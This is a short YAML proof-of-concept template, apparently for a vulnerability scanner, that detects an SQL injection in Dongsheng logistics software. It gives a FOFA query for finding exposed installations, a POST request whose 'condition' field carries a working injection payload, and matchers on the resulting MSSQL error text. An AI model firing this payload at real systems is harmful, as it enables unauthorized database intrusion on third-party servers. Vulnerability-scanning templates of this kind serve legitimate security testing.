id: poc-yaml-dongshengsoft-chfee-hexiao-sqli
info:
  name: 东胜物流软件 Chfee_hexiao SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 东胜物流软件
  fofa: app="东胜物流软件-物流软件"
requests:
- method: POST
  path: /Account/Chfee_hexiao/GetDataList
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: start=0&condition=1<@@VERSION&limit=10
  expression: status_code == 500 && contains(body,"Microsoft SQL Server") && contains(body,"SqlException")
    && matches(body,"转换成数据类型(.*?)时失败") && matches(body,"在将(.*?)值")
variables: {}
transport: http
